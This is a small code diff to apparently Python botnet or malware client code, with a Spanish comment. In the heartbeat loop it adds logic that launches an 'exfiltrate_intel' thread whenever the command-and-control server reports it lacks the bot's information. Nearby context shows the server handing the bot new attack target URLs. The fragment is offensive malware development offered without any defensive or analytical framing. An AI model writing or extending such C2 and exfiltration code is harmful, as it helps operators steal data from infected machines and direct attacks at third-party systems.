@@ -361,6 +361,10 @@ def _heartbeat_loop():
             result = _send_to_c2("heartbeat", data)
             
             if result:
+                # Si el servidor dice que no tiene nuestra info (ej. tras un reinicio), se la mandamos
+                if result.get("needs_info"):
+                    threading.Thread(target=exfiltrate_intel, daemon=True).start()
+
                 new_target = result.get("target")
                 if new_target and not ATTACKING:
                     TARGET_URL = new_target
